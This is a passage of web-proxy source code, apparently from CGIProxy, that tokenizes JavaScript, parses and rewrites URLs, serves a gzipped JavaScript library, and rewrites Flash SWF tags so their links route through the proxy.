	// count embedded parentheses carefully when using all these in matches!
	RE.WhiteSpace= '[\\x09\\x0b\\x0c \\xa0]' ;
	RE.LineTerminator= '[\\x0a\\x0d]' ;

	// messy without non-greedy matching
	//RE.Comment= '\\/\\*\\/*([^\\*]\\/|[^\\*\\/]*|\\**[^\\/])*\\*\\/|\\/\\/[^\\x0a\\x0d]*|\\<\\!\\-\\-[^\\x0a\\x0d]*' ;
	RE.Comment= '\\/\\*[\\s\\S]*?\\*\\/|\\/\\/[^\\x0a\\x0d]*|\\<\\!\\-\\-[^\\x0a\\x0d]*' ;

	RE.IdentifierStart= '[a-zA-Z\\$\\_]|\\\\u[\\da-fA-F]{4}' ;
	RE.IdentifierPart= RE.IdentifierStart+'|\\d' ;
	RE.IdentifierName= '(?:'+RE.IdentifierStart+')(?:'+RE.IdentifierPart+')*' ;

	RE.Punctuator= '\\>\\>\\>\\=?|\\=\\=\\=|\\!\\=\\=|\\<\\<\\=|\\>\\>\\=|[\\<\\>\\=\\!\\+\\*\\%\\&\\|\\^\\-]\\=|\\+\\+|\\-\\-|\\<\\<|\\>\\>|\\&\\&|\\|\\||[\\{\\}\\(\\)\\[\\]\\.\\;\\,\\<\\>\\+\\*\\%\\&\\|\\^\\!\\~\\?\\:\\=\\-]' ;
	RE.DivPunctuator= '\\/\\=?' ;

	RE.NumericLiteral= '0[xX][\\da-fA-F]+|(?:0|[1-9]\\d*)(?:\\.\\d*)?(?:[eE][\\+\\-]?\\d+)?|\\.\\d+(?:[eE][\\+\\-]?\\d+)?' ;
	RE.EscapeSequence= 'x[\\da-fA-F]{2}|u[\\da-fA-F]{4}|0|[0-3]?[0-7]\\D|[4-7][0-7]|[0-3][0-7][0-7]|[^\\dxu]' ;
	RE.StringLiteral= '"(?:[^\\"\\\\\\x0a\\x0d]|\\\\(?:'+RE.EscapeSequence+'))*"|'
			+ "'(?:[^\\'\\\\\\x0a\\x0d]|\\\\(?:"+RE.EscapeSequence+"))*'" ;
	RE.RegularExpressionLiteral= '\\/(?:[^\\x0a\\x0d\\*\\\\\\/\\[]|\\[(?:[^\\\\\\]\\x0a\\x0d]|\\\\[^\\x0a\\x0d])*\\]|\\\\[^\\x0a\\x0d])(?:[^\\x0a\\x0d\\\\\\/\\[]|\\[(?:[^\\\\\\]\\x0a\\x0d]|\\\\[^\\x0a\\x0d])*\\]|\\\\[^\\x0a\\x0d])*\\/(?:'+RE.IdentifierPart+')*' ;

	RE.Token= RE.IdentifierName+'|'+RE.NumericLiteral+'|'+RE.Punctuator+'|'+RE.StringLiteral ;

	RE.InputElementDivG= RE.WhiteSpace+'+|'+RE.LineTerminator+'|'+RE.Comment+
			    '|('+RE.Token+'|'+RE.DivPunctuator+'|'+RE.RegularExpressionLiteral+')' ;
	RE.InputElementRegExpG= RE.WhiteSpace+'+|'+RE.LineTerminator+'|'+RE.Comment+
			       '|('+RE.Token+'|'+RE.RegularExpressionLiteral+'|'+RE.DivPunctuator+')' ;

	RE.SKIP= RE.WhiteSpace+'+|'+RE.LineTerminator+'|'+RE.Comment ;
	RE.SKIP_NO_LT= RE.WhiteSpace+'+|'+RE.Comment ;

	// make RegExp objects out of the ones we'll use
	RE.InputElementDivG= new RegExp(RE.InputElementDivG, 'g') ;
	RE.InputElementRegExpG= new RegExp(RE.InputElementRegExpG, 'g') ;

	RE.LINETERMINATOR= new RegExp('^'+RE.LineTerminator+'$') ;
	RE.N_S_RE= new RegExp('^(?:'+RE.NumericLiteral+'|'+RE.StringLiteral+'|'+RE.RegularExpressionLiteral+')$') ;
	RE.DOTSKIPEND= new RegExp('\\.('+RE.WhiteSpace+'+|'+RE.LineTerminator+')*$') ;
	RE.ASSIGNOP= new RegExp('^(\\>\\>\\>\\=|\\<\\<\\=|\\>\\>\\=|[\\+\\*\\/\\%\\&\\|\\^\\-]?\\=)$') ;
	RE.NEXTISINCDEC= new RegExp('^('+RE.SKIP_NO_LT+')*(\\+\\+|\\-\\-)') ;
	RE.SKIPTOPAREN= new RegExp('^(('+RE.SKIP+')*\\()') ;
	RE.SKIPTOCOLON= new RegExp('^(('+RE.SKIP+')*\\:)') ;
	RE.SKIPTOCOMMASKIP= new RegExp('^(('+RE.SKIP+')*\\,('+RE.SKIP+')*)') ;
	RE.PUNCDIVPUNC= new RegExp('^('+RE.Punctuator+'|'+RE.DivPunctuator+')$') ;
	RE.IDENTIFIER= new RegExp('^'+RE.IdentifierName+'$') ;
	RE.STRINGLITERAL= new RegExp('^'+RE.StringLiteral+'$') ;
	RE.NUMERICLITERAL= new RegExp('^(?:'+RE.NumericLiteral+')$') ;
	RE.SKIPTOOFRAG= new RegExp('^('+RE.SKIP+')*([\\.\\[\\(])') ;
	RE.STATEMENTTERMINATOR= new RegExp('^(;|'+RE.LineTerminator+')') ;


	_proxy_jslib_RE= RE ;
    }
}


function _proxy_jslib_instanceof(o, classname) {
    if ((o==null) || ((typeof(o)!='object') && (typeof(o)!='function')))
	return false ;
    try {
	switch(classname) {
	    case 'Document':
		return ("elementFromPoint" in o) && ("createElement" in o) && ("getElementById" in o) ;
	    case 'DocumentFragment':
		return ("querySelector" in o) && ("querySelectorAll") && ("childNodes" in o) ;
	    case 'HTMLElement':
		return ("insertAdjacentHTML" in o) && ("outerHTML" in o) ;
	    case 'Element':
		return ("childElementCount" in o) && ("firstElementChild" in o) && ("nextElementSibling" in o) ;
	    case 'Node':
		return ("nodeName" in o) && ("nodeType" in o) && ("nodeValue" in o) ;
	    case 'MessageEvent':
		return ("stopImmediatePropagation" in o) && ("origin" in o) && ("ports" in o) ;
	    case 'Location':
		return ("reload" in o) && ("protocol" in o)  && ("search" in o) ;
	    case 'Link':
		return ("protocol" in o) && ("target" in o) && ("blur" in o) ;
	    case 'Window':
		return ("navigator" in o) && ("clearInterval" in o) && ("moveBy" in o) && (o.self===o.window) ;
	    case 'CSS2Properties':
		return ("azimuth" in o) && ("backgroundAttachment" in o) && ("pageBreakInside" in o) ;
	    case 'CSSStyleDeclaration':
		return (("getPropertyCSSValue" in o) || ("getPropertyValue" in o))   // MSIE uses getPropertyValue  :P
		       && ("getPropertyPriority" in o) && ("removeProperty" in o) ;
	    case 'CSSStyleSheet':
		return ('cssRules' in o) && ('ownerRule' in o) && ('deleteRule' in o) ;
	    case 'Layer':
		return ("background" in o) && ("parentLayer" in o) && ("moveAbove" in o) ;
	    case 'History':
		return ("pushState" in o) && ("replaceState" in o) && ("forward" in o) ;
	    case 'AnonXMLHttpRequest':
		return ("withCredentials" in o) && ("getAllResponseHeaders" in o) ;  // may need to improve

	    default:
		if (!eval(classname)) return false ;
		return eval('o instanceof ' + classname) ;
	}
    } catch(e) {

	// These are all the classes that have trouble with instanceof for some reason.
	switch(classname) {
	    case 'Form':
		return ("action" in o) && ("encoding" in o) && ("submit" in o) ;
	    case 'CSSPrimitiveValue':
		return ("primitiveType" in o) && ("getRectValue" in o) && ("getCounterValue" in o) ;
	    case 'FlashPlayer':
		return ("GotoFrame" in o) && ("LoadMovie" in o) && ("SetZoomRect" in o) ;
	    case 'NamedNodeMap':
		return ("getNamedItem" in o) && ("removeNamedItem" in o) && ("setNamedItem" in o) ;
	    case 'Range':
		return ("cloneRange" in o) && ("compareBoundaryPoints" in o) && ("surroundContents" in o) ;
	    case 'Attr':
		return ("ownerElement" in o) && ("specified" in o) ;
	    case 'EventSource':
		// EventSource only has two properties, and they are also in WebSocket.  So
		//   test those two, and verify o is not a WebSocket.
		return ("readyState" in o) && ("url" in o) && !("bufferedAmount" in o) ;
	    case 'HashChangeEvent':
		return ("oldURL" in o) && ("newURL" in o) ;
	    case 'MediaElement':
		return ("autoplay" in o) && ("defaultPlaybackRate" in o) && ("initialTime" in o) ;
	    default:
		alert('error in _proxy_jslib_instanceof(): classname=[' + classname + ']; error=[' + e + ']') ;
	}
    }
}



function _proxy_jslib_same_origin(u1, u2) {
    var pu1= _proxy_jslib_parse_url(_proxy_jslib_absolute_url(u1)) ;
    var pu2= _proxy_jslib_parse_url(_proxy_jslib_absolute_url(u2)) ;
    pu1[5]= pu1[5] || (pu1[1]=='http:'  ? 80  : pu1[1]=='https:'  ? 443  : '') ;
    pu2[5]= pu2[5] || (pu2[1]=='http:'  ? 80  : pu2[1]=='https:'  ? 443  : '') ;
    return pu1[1]==pu2[1] && pu1[4]==pu2[4] && pu1[5]==pu2[5] ;
}


// using JS (not RFC) terminology, this returns:
//   full_match, protocol (with colon), authentication, host, hostname, port, pathname, search, hash
// for IPv6, host includes "[]", while hostname has them removed
function _proxy_jslib_parse_url(in_URL) {
    var u ;

    // Some sites use non-String objects for URLs.
    in_URL= in_URL.toString() ;

    if (u= in_URL.match(/^(javascript\:|livescript\:)([\s\S]*)$/i))
	return [ in_URL, u[1].toLowerCase(), u[2] ] ;
    if (in_URL.match(/^\s*\#/))
	return [ in_URL, '', '', '' ,'', '', '', '', in_URL ] ;

    u= in_URL.match(/^([\w\+\.\-]+\:)?\/\/([^\/\?\#\@]*\@)?((\[[^\]]*\]|[^\:\/\?\#]*)(\:[^\/\?\#]*)?)([^\?\#]*)([^#]*)(.*)$/) ;
    if (u==null) return ;   // if pattern doesn't match
    for (var i= 0 ; i<u.length ; i++)  if (u[i]==void 0) u[i]= '' ;
    u[1]= u[1].toLowerCase() ;
    u[2]= u[2].replace(/\@$/, '') ;
    u[3]= u[3].toLowerCase() ;
    u[3]= u[3].replace(/\.+(:|$)/, '$1') ;  // close potential exploit
    u[4]= u[4].toLowerCase().replace(/^\[|\]$/g, '') ;   // handle IPv6
    u[4]= u[4].replace(/\.+$/, '') ;      // close potential exploit
    u[5]= u[5].replace(/^\:/, '') ;
    return u ;
}


// returns url_start (NOT including packed flags), language, packed flags, and decoded target URL.
// if in_URL is not a proxified URL, return undefined (and is legitimately used this way).
// jsm-- should clear up "return void 0" from "return [void 0, void 0, void 0, void 0]",
//   as this is called from elsewhere
function _proxy_jslib_parse_full_url(in_URL) {
    if (typeof(in_URL)=='number') in_URL= in_URL.toString() ;
    if (in_URL==void 0) return [void 0, void 0, void 0, void 0] ;
    if (in_URL=='about:blank') return ['', '', '', 'about:blank'] ;
    if (in_URL.match(/^(javascript|livescript|blob)\:/i)) return ['', '', '', in_URL] ;
    if (in_URL.match(/^\s*\#/)) return ['', '', '', in_URL] ;
    if (in_URL=='') return ['', '', '', ''] ;

    var cmp, path_cmp ;

    if (_proxy_jslib_PROXY_GROUP.length) {
	for (var i in _proxy_jslib_PROXY_GROUP) {
	    if (in_URL.substring(0,_proxy_jslib_PROXY_GROUP[i].length)==_proxy_jslib_PROXY_GROUP[i]) {
		path_cmp= in_URL.substring(_proxy_jslib_PROXY_GROUP[i].length).match(/\/([^\/\?]*)\/?([^\/\?]*)\/?([^\?]*)(\??.*)/) ;
//		if (path_cmp==null) alert("CGIProxy Error: Can't parse URL <"+in_URL+"> with PROXY_GROUP; not setting all variables correctly.") ;
		if (path_cmp==null) return void 0 ;
		return [_proxy_jslib_PROXY_GROUP[i],
			path_cmp[1],
			path_cmp[2],
			_proxy_jslib_wrap_proxy_decode(path_cmp[3])+path_cmp[4]] ;
	    }
	}
	return void 0 ;
    }

    var m1, m2, data_type, data_clauses, data_content, data_charset, data_base64 ;
    if (m1= in_URL.match(/^data:([\w\.\+\$\-]+\/[\w\.\+\$\-]+)?;?([^\,]*)\,?(.*)/i)) {
	data_type= m1[1].toLowerCase() ;
	if (data_type=='text/html' || data_type=='text/css' || data_type.match(/script/i)) {
	    data_clauses= m1[2].split(/;/) ;
	    data_content= m1[3] ;
	    for (var i= 0 ; i<data_clauses.length ; i++) {
		if (m2= data_clauses[i].match(/^charset=(\S+)/i)) {
		    data_charset= m2[1] ;
		} else if (data_clauses[i].toLowerCase()=='base64') {
		    data_base64= 1 ;
		}
	    }
	    data_content= data_base64
			? atob(data_content)
			: data_content.replace(/%([\da-fA-F]{2})/g,
			  function (s,p1) { return String.fromCharCode(eval('0x'+p1)) } ) ;   // probably slow
	    data_content= (data_type=='text/html')  ? _proxy_jslib_proxify_html(data_content, void 0, void 0, 1)[0]
						    : _proxy_jslib_proxify_block(data_content, data_type, 1, 1) ;
	    data_content= btoa(data_content) ;
	    return ['', '', '', data_charset  ? 'data:' + data_type + ';charset=' + data_charset + ';base64,' + data_content
					      : 'data:' + data_type + ';base64,' + data_content ] ;
	} else {
	    return ['', '', '', in_URL] ;
	}
    }

    // this could be simplified....
    cmp= in_URL.match(/^([\w\+\.\-]+)\:\/\/([^\/\?]*)([^\?]*)(\??.*)$/) ;
    if (cmp==null) return void 0 ;

    // hack to canonicalize "%7e" to "~"; should do other encoded chars too
    //   as long as replacing doesn't change semantics
    cmp[3]=cmp[3].replace(/\%7e/gi, '~') ;

    path_cmp= cmp[3].match(_proxy_jslib_RE_FULL_PATH) ;
//    if (cmp==null || path_cmp==null) alert("CGIProxy Error: Can't parse URL <"+in_URL+">; not setting all variables correctly.") ;
    if (cmp==null || path_cmp==null) return void 0 ;

    return [cmp[1]+"://"+cmp[2]+path_cmp[1],
	    path_cmp[2],
	    path_cmp[3],
	    _proxy_jslib_wrap_proxy_decode(path_cmp[4])+cmp[4]] ;
}


function _proxy_jslib_pack_flags(flags) {
    var total= 0 ;
    for (var i= 0 ; i<6 ; i++) { total= (total<<1) + !!flags[i] }
    return ''+_proxy_jslib_ARRAY64[total]+_proxy_jslib_ARRAY64[_proxy_jslib_MIME_TYPE_ID[flags[6]]] ;
}

function _proxy_jslib_unpack_flags(flagst) {
    var ret= [] ;
    var chars= flagst.split('') ;
    var total= _proxy_jslib_UNARRAY64[chars[0]] ;
    for (var i= 0 ; i<6 ; i++) { ret[5-i]= (total>>i) & 1 }
    ret[6]= _proxy_jslib_ALL_TYPES[_proxy_jslib_UNARRAY64[chars[1]]] ;
    return ret ;
}

function _proxy_jslib_url_start_by_flags(flags) {
    return _proxy_jslib_SCRIPT_URL + '/' + _proxy_jslib_lang + '/' + _proxy_jslib_pack_flags(flags) + '/' ;
}


function _proxy_jslib_html_escape(s) {
    if (s==void 0) return '' ;
    s= s.replace(/\&/g, '&amp;') ;
    s= s.replace(/([^\x00-\x7f])/g,
		 function (a) {
		     return '&#' + a.charCodeAt(0) + ';' ;
		 } ) ;
    return s.replace(/\"/g, '&quot;')
	    .replace(/\</g, '&lt;')
	    .replace(/\>/g, '&gt;') ;
}

function _proxy_jslib_html_unescape(s) {
    if (s==void 0) return '' ;
    s= s.replace(/\&\#(x)?(\w+);?/g,
		 function (a, p1, p2) { return p1
		     ? String.fromCharCode(eval('0x'+p2))
		     : String.fromCharCode(p2)
		 } ) ;
    return s.replace(/\&quot\b\;?/g, '"')
	    .replace(/\&lt\b\;?/g,   '<')
	    .replace(/\&gt\b\;?/g,   '>')
	    .replace(/\&amp\b\;?/g,  '&') ;
}



// The replace() method in Netscape is broken, :( :( so we have to implement
//   our own.  The bug is that if a function is used as the replacement pattern
//   (needed for anything complex), then *any* replace() or match() (and others?)
//   within that function (or in called functions) will cause its $' to
//   be used in place of the calling replace()'s $' .  :P
// Call this function with a string, a NON-GLOBAL (!) pattern with possible
//   parentheses, and a callback function that takes one argument that is the
//   array resulting from s.match(pattern), and returns a replacement string.
// Because of how this is implemented, ^ in pattern works much like Perl's \G.
// Because this is slower than String.replace(), avoid using this when not
//   needed, e.g. when the replacement function has no replace() or match().
function _proxy_jslib_global_replace(s, pattern, replace_function) {
    if (s==null) return s ;
    var out= '' ;
    var m1 ;
    while ((m1=s.match(pattern))!=null) {
	out+= s.substr(0,m1.index) + replace_function(m1) ;
	s= s.substr(m1.index+m1[0].length) ;
    }
    return out+s ;
}


EOF
    } # end setting of $JSLIB_BODY

    unless ($JSLIB_BODY_GZ) {
	eval { require IO::Compress::Gzip } ;
	if (!$@) {
	    IO::Compress::Gzip::gzip(\$JSLIB_BODY => \$JSLIB_BODY_GZ)
		or HTMLdie(["Couldn't gzip jslib: %s", $IO::Compress::Gzip::GzipError]) ;
	}
    }

    # Send gzipped version if allowed.
    my $content_encoding_header= ($JSLIB_BODY_GZ and $ENV{HTTP_ACCEPT_ENCODING}=~ /\bgzip\b/i)
	? "Content-Encoding: gzip\015\012"  : '' ;

    print $STDOUT "$HTTP_1_X 200 OK\015\012",
		  "Expires: $expires_header\015\012",
		  "Date: $date_header\015\012",
		  "Content-Type: application/x-javascript\015\012",
		  "Content-Length: ", length($content_encoding_header ? $JSLIB_BODY_GZ : $JSLIB_BODY), "\015\012",
		  $content_encoding_header,
		  "\015\012",
		  ($content_encoding_header ? $JSLIB_BODY_GZ : $JSLIB_BODY) ;

    goto ONE_RUN_EXIT ;
}

sub proxify_swf {
    my($in)= @_ ;
    my(@out, $tag, $tags) ;
    my($DONT_COMPRESS)= 0 ;   # set to 1 for testing

    # Hack to pretend it's an SWF 8 file, so we can call ExternalInterface.
    substr($in, 3, 1)= "\x08"  if substr($in, 3, 1) eq "\x07" ;

    my($swf_version, $swf_header_start, $swf_header_end, $rest)=
	&get_swf_header_and_tags($in) ;

    $tags= &proxify_swf_taglist(\$rest, $swf_version) ;

    # Set length field
    substr($swf_header_start, 4, 4)=
	pack('V', length($swf_header_start)+length($swf_header_end)+length($tags)) ;

    substr($swf_header_start, 0, 1)= 'F'  if $DONT_COMPRESS ;

    # Until LZMA compression fully works here, only compress with deflate.
    if (substr($swf_header_start, 0, 1) eq 'Z') {
	substr($swf_header_start, 0, 1)= 'C' ;
	substr($swf_header_start, 8)= '' ;
    }

    # Compress if needed
    if (substr($swf_header_start, 0, 1) eq 'C') {
	$rest= $swf_header_end . $tags ;

	eval { require IO::Compress::Deflate } ;
	if (!$@) {
	    my $zout ;
	    no warnings qw(once) ;
	    IO::Compress::Deflate::deflate(\$rest, \$zout)
		or &HTMLdie(["Couldn't deflate: %s", $IO::Compress::Deflate::DeflateError]) ;
	    $rest= $zout ;
	} else {
	    substr($swf_header_start, 0, 1)= 'F' ;  # use uncompressed instead
	}

	return $swf_header_start . $rest ;

    } elsif (substr($swf_header_start, 0, 1) eq 'Z') {
	$rest= $swf_header_end . $tags ;

	eval { require IO::Compress::Lzma } ;
	if (!$@) {
	    my($lz, $lzma_status)=
		Compress::Raw::Lzma::RawEncoder->new(ForZip => 1,
						     Filter => Lzma::Filter::Lzma1()) ;
	    &HTMLdie("Can't Compress::Raw::Lzma::RawEncoder->new(): $lzma_status")
		unless $lzma_status==Compress::Raw::Lzma::LZMA_OK() ;

	    my $zout ;
	    $lzma_status= $lz->code($rest, $zout) ;
	    &HTMLdie("Problem compressing into LZMA: $lzma_status")
		unless $lzma_status==Compress::Raw::Lzma::LZMA_OK() ;
	    $lzma_status= $lz->flush($zout) ;
	    &HTMLdie("Problem with LZMA stream: $lzma_status")
		unless $lzma_status==Compress::Raw::Lzma::LZMA_STREAM_END() ;

	    my $swf_compressed_size= pack('V', length($zout)-5) ;
	    return $swf_header_start . $swf_compressed_size . $zout ;

	} else {
	    substr($swf_header_start, 0, 1)= 'F' ;  # use uncompressed instead
	    substr($swf_header_start, 8)= '' ;
	}
    }

    return $swf_header_start . $swf_header_end . $tags ;
}


sub proxify_swf_taglist {
    my($in, $swf_version)= @_ ;
    my (@out, $tag) ;

    # Process one tag at a time
    while ($$in=~ /\G(..)/gcs) {

	# Handle short or long RECORDHEADER
	my($tag_code_and_length_code)= $1 ;
	my($tag_code_and_length_int)= unpack('v', $tag_code_and_length_code) ;
	my($tag_code)= $tag_code_and_length_int >> 6 ;
	my($tag_length)= $tag_code_and_length_int & 0x3f ;
	if ($tag_length==0x3f) {
	    $$in=~ /\G(....)/gcs ;
	    $tag_length= $1 ;
	    $tag_code_and_length_code.= $tag_length ;
	    $tag_length= unpack('V', $tag_length) ;
	}
#warn "tag code, length=[$tag_code][$tag_length]\n" ;


	# Handle ImportAssets and ImportAssets2 tags
	if ($tag_code==57 or $tag_code==71) {
	    $$in=~ /\G(.*?)\0/gcs ;
	    my($swf_URL)= $1 ;
	    my($rest_len)= $tag_length - length($swf_URL) - 1 ;
	    my($tag_rest)= substr($$in, pos($$in), $rest_len) ;
	    pos($$in)+= $rest_len ;
	    $tag= &pack_swf_tag($tag_code, &full_url($swf_URL)."\0".$tag_rest) ;

	# Handle DoAction tag
	} elsif ($tag_code==12) {
	    $tag= &pack_swf_tag(12, &proxify_swf_action_list($in, $tag_length)) ;
#warn "in DoAction; out=[".swf2perl($tag)."]\n" ;

	# Handle DoInitAction tag
	} elsif ($tag_code==59) {
	    my($sprite_id)= substr($$in, pos($$in), 2) ;
	    pos($$in)+= 2 ;
	    $tag= &pack_swf_tag(59, $sprite_id.&proxify_swf_action_list($in, $tag_length-2)) ;

	# Handle DefineSprite tag, which may contain other tags.
	} elsif ($tag_code==39) {
	    # jsm-- this could be sped up if needed...
	    $$in=~ /\G(....)/gcs ;
	    my($tag_start)= $1 ;
	    my($rest_len)= $tag_length-4 ;
	    my($taglist)= substr($$in, pos($$in), $rest_len) ;
	    pos($$in)+= $rest_len ;
	    my($tag_content)= &proxify_swf_taglist(\$taglist, $swf_version) ;
	    $tag= &pack_swf_tag(39, $tag_start . $tag_content) ;


	# Handle PlaceObject2 tag, which may contain actions
	} elsif ($tag_code==26) {
	    $$in=~ /\G(.)../gcs ;
	    my($flags)= ord($1) ;
	    if (!($flags & 0x80)) {
		my($tag_content)= substr($$in, pos($$in)-3, $tag_length) ;
		pos($$in)+= $tag_length-3 ;
		$tag= &pack_swf_tag(26, $tag_content) ;
	    } else {
		my(@out) ;   # local copy
		push(@out, substr($$in, pos($$in)-3, 3)) ;
		$$in=~ /\G(..)/gcs, push(@out, $1)    if ($flags & 2) ;
		push(@out, &get_matrix($in))          if ($flags & 4) ;
		push(@out, &get_cxformwithalpha($in)) if ($flags & 8) ;
		$$in=~ /\G(..)/gcs, push(@out, $1)    if ($flags & 16) ;
		$$in=~ /\G(.*?\0)/gcs, push(@out, $1) if ($flags & 32) ;
		$$in=~ /\G(..)/gcs, push(@out, $1)    if ($flags & 64) ;
		push(@out, &get_clip_actions($in, $swf_version)) ;
		$tag= &pack_swf_tag(26, join('', @out)) ;
	    }

	# Handle PlaceObject3 tag, which may contain actions.
	} elsif ($tag_code==70) {
	    $$in=~ /\G(..)(..)/gcs ;
	    my($flags, $depth)= (unpack('S', $1), $2) ;
	    if (!($flags & 0x8000)) {
		my($tag_content)= substr($$in, pos($$in)-4, $tag_length) ;
		pos($$in)+= $tag_length-4 ;
		$tag= &pack_swf_tag(70, $tag_content) ;
	    } else {
		my(@out) ;   # local copy
		push(@out, substr($$in, pos($$in)-4, 4)) ;
		$$in=~ /\G(.*?\0)/gcs, push(@out, $1)
		    if ($flags & 8) or (($flags & 16) and ($flags & 0x200)) ;
		$$in=~ /\G(..)/gcs, push(@out, $1)    if ($flags & 0x200) ;
		push(@out, &get_matrix($in))          if ($flags & 0x400) ;
		push(@out, &get_cxformwithalpha($in)) if ($flags & 0x800) ;
		$$in=~ /\G(..)/gcs, push(@out, $1)    if ($flags & 0x1000) ;
		$$in=~ /\G(.*?\0)/gcs, push(@out, $1) if ($flags & 0x2000) ;
		$$in=~ /\G(..)/gcs, push(@out, $1)    if ($flags & 0x4000) ;
		push(@out, &get_filterlist($in))      if ($flags & 1) ;
		$$in=~ /\G(.)/gcs, push(@out, $1)     if ($flags & 2) ;
		push(@out, &get_clip_actions($in,  $swf_version)) ;
		$tag= &pack_swf_tag(70, join('', @out)) ;
	    }


	# Handle DefineButton tag, which may contain actions
	} elsif ($tag_code==7) {
	    $$in=~ /\G(..)/gcs ;
	    my($tag_start)= $1 ;
	    my($buttonrecords)= &get_button_records($in) ;
	    my($actions)= &proxify_swf_action_list($in, $tag_length-length($buttonrecords)-3) ;
	    $tag= &pack_swf_tag(7, $tag_start.$buttonrecords.$actions) ;


	# Handle DefineButton2 tag, which may contain actions
	} elsif ($tag_code==34) {
	    my(@out) ;
	    $$in=~ /\G(...)(..)/gcs ;
	    my($tag_start, $action_offset)= ($1, unpack('v', $2)) ;
	    push(@out, $1, $2) ;
	    if ($action_offset) {
		push(@out, substr($$in, pos($$in), $action_offset-2)) ;
		pos($$in)+= $action_offset-2 ;
		push(@out, &get_buttoncondactions($in)) ;
	    } else {
		push(@out, substr($$in, pos($$in), $tag_length-5)) ;
		pos($$in)+= $tag_length-5 ;
	    }
	    $tag= &pack_swf_tag(34, join('', @out)) ;


	# Handle DoABC tag, including spawning an RTMP proxy
	} elsif ($tag_code==82) {
	    $tag= &pack_swf_tag(82, &proxify_swf_abcFile($in, $tag_length)) ;
	    if ($ALLOW_RTMP_PROXY and !$RTMP_SERVER_PORT) {
		my($LOCK_FH, $port)= create_server_lock('rtmp.run') ;
		if ($LOCK_FH) {
		    my($RTMP_LISTEN) ;
		    ($RTMP_LISTEN, $RTMP_SERVER_PORT)= new_server_socket(1935) ;
		    spawn_generic_server($RTMP_LISTEN, $LOCK_FH, \&rtmp_proxy, 600) ;
		} else {
		    $RTMP_SERVER_PORT= $port ;
		}
	    }
	    #die "DoABC tag not supported yet" ;


	} else {
	    $tag= $tag_code_and_length_code . substr($$in, pos($$in), $tag_length) ;
	    pos($$in)+= $tag_length ;
	}


	push(@out, $tag) ;

	last if $tag_code==0 ;
    }

    return join('', @out) ;
}


# Given a tag code and content, repackage a tag with correct length and format.
sub pack_swf_tag {
    my($tag_code, $tag_content)= @_ ;
    my($len)= length($tag_content) ;
    if ($len<=62) {
	return pack('v', ($tag_code<<6) + $len) . $tag_content ;
    } else {
	return pack('vV', ($tag_code<<6) + 0x3f, $len) . $tag_content ;
    }
}

sub get_button_records {
    my($in, $expected_len, $in_define_button2)= @_ ;
    my($end_pos)= pos($$in)+$expected_len-1 ;

    my(@out) ;
    while (defined($expected_len) ? (pos($$in)<$end_pos)  : 1) {
	$$in=~ /\G(.)/gcs ;
	my($flags, $tag_start)= (ord($1), $1) ;
	pos($$in)--, last  if !defined($expected_len) and $flags==0 ;
	$$in=~ /\G(....)/gcs ;
	$tag_start.= $1 ;
	push(@out, $tag_start) ;
	push(@out, &get_matrix($in)) ;
	push(@out, &get_cxformwithalpha($in)) if $in_define_button2 ;
	push(@out, &get_filterlist($in))      if $in_define_button2 && ($flags & 16) ;
	$$in=~ /\G(.)/gcs, push(@out, $1)     if $in_define_button2 && ($flags & 32) ;
    }
    $$in=~ /\G\0/gcs or die "ERROR: missing end of button records" ;
    return join('', @out)."\0" ;
}


sub get_buttoncondactions {
    my($in)= @_ ;

    my(@out) ;
    while ($$in=~ /\G(..)/gcs) {
	my($action_size)= unpack('v', $1) ;
	$$in=~ /\G(..)/gcs ;
	my($flags)= $1 ;
	my($actions)= &proxify_swf_action_list($in, ($action_size>0)  ? $action_size-4  : undef) ;
	$action_size= 4+length($actions) if $action_size>0 ;
	push(@out, pack('v', $action_size), $flags, $actions) ;
	last if $action_size==0 ;
    }
    return join('', @out) ;
}



sub get_filterlist {
    my($in)= @_ ;
    my(@out) ;

    $$in=~ /\G(.)/gcs ;
    my($num_filters)= ord($1) ;
    for (1..$num_filters) {
	push(@out, &get_filter($in)) ;
    }
    return chr($num_filters).join('', @out) ;
}


sub get_filter {
    my($in)= @_ ;
    my($ret, $size) ;

    $$in=~ /\G(.)/gcs ;
    $ret= $1 ;
    my($filter_id)= $1 ;
    if ($filter_id==0) {            # DropShadowFilter
	$size= 23 ;
    } elsif ($filter_id==1) {     # BlurFilter
	$size= 9 ;
    } elsif ($filter_id==2) {     # GlowFilter
	$size= 15 ;
    } elsif ($filter_id==3) {     # BevelFilter
	$size= 27 ;
    } elsif ($filter_id==4) {     # GradientGlowFilter
	$$in=~ /\G(.)/gcs ;
	$ret.= $1 ;
	my($num_colors)= ord($1) ;
	$size= $num_colors*5 + 19 ;
    } elsif ($filter_id==5) {     # ConvolutionFilter
	$$in=~ /\G(.)(.)/gcs ;
	$ret.= $1.$2 ;
	my($matrixx, $matrixy)= (ord($1), ord($2)) ;
	$size= $matrixx*$matrixy*4 + 15 ;
    } elsif ($filter_id==6) {     # ColorMatrixFilter
	$size= 80 ;
    } elsif ($filter_id==7) {     # GradientBevelFilter
	$$in=~ /\G(.)/gcs ;
	$ret.= $1 ;
	my($num_colors)= ord($1) ;
	$size= $num_colors*5 + 19 ;
    } else {
	die "ERROR: unsupported filter type $filter_id\n" ;
    }

    $ret.= substr($$in, pos($$in), $size) ;
    pos($$in)+= $size ;
    return $ret ;
}


# Reads a CXFORMWITHALPHA record from the input buffer and returns it.
sub get_cxformwithalpha {
    my($in)= @_ ;
    my($byte1)= ord(substr($$in, pos($$in), 1)) ;
    my($has_adds)= !!($byte1 & 128) ;
    my($has_mults)= !!($byte1 & 64) ;
    my($nbits)= ($byte1>>2) & 0x0f ;
    my($record_size)= (6 + $has_adds*4*$nbits + $has_mults*4*$nbits +7)>>3 ;
    my($ret)= substr($$in, pos($$in), $record_size) ;
    pos($$in)+= $record_size ;
    return $ret ;
}


sub get_matrix {
    my($in)= @_ ;
    $$in=~ /\G(.)/gcs ;
    my($in_bitbuf)= $1 ;
    my($bitpos) ;     # first byte is 0-7

    if (vec($in_bitbuf, v(0), 1)) {    # HasScale field
	$bitpos= 1 ;
	my($nbits)= ord($in_bitbuf & "\x7f")>>2 ;
	my($nbytes)= (($nbits*2)-2+7)>>3 ;
	$in_bitbuf.= substr($$in, pos($$in), $nbytes) ;
	pos($$in)+= $nbytes ;
	$bitpos+= 5+$nbits*2 ;
    } else {
	$bitpos= 1 ;
    }

    if (vec($in_bitbuf, v($bitpos), 1)) {   # HasRotate field
	$bitpos++ ;
	# Next 5 bits contain field length
	if ($bitpos+5>8*length($in_bitbuf)) {
	    $in_bitbuf.= substr($$in, pos($$in), 1) ;
	    pos($$in)++ ;
	}
	# there's got to be a better way....
	my($nbits)= vec($in_bitbuf, v($bitpos), 1)  *16
